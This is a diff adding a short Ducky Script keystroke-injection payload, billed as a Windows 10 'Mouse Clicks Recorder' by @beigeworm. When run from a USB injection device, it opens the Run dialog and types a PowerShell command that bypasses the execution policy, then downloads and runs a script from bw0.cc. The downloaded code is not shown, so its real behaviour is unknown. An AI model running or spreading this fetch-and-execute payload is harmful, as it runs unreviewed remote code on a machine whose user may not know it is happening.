@@ -1,0 +1,16 @@
+
+REM Title: Mouse Clicks Recorder
+REM Author: @beigeworm
+REM Description: Record your mouse clicks and positions along with interval time between clicks.. (for loading screens etc.)
+REM Description: Play them back later and automate clicky tasks!
+REM Target: Windows 10
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+REM open powershell
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -Ep Bypass -C iex (irm bw0.cc/mrec)
+ENTER
